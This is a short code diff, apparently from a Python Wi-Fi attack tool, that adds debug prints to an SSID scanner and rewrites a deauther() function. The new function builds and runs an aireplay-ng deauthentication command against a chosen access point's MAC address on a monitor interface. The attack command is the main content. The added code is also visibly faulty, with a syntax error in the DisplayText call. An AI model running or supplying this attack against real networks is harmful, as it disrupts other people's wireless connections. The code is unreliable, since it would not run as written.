@@ -1449,7 +1449,9 @@ def getSSID():
         res[i] = res[i].split(",")
         del res[i][-1]
         res[i]=res[i][-1]+ ","+res[i][3] +","+ res[i][0]
+        print(res[i])
     ssidlist=res
+    print(res)
 
     #----------------------------------------------------------
     listattack=ssidlist
@@ -1511,7 +1513,15 @@ def getSSID():
 
 
 def deauther():
-    getSSID()
+    target = getSSID()
+    #name,channel,mac
+    DisplayText("this will work","for 10 second","","","",""."")
+    target= target.split(",")
+    cmd="aireplay-ng -0 10 -a " + target[2] + " wlan0mon"
+    res = execcmd(cmd)
+    if(res==-1):
+        displayError()
+        exit()
     return()
     
         
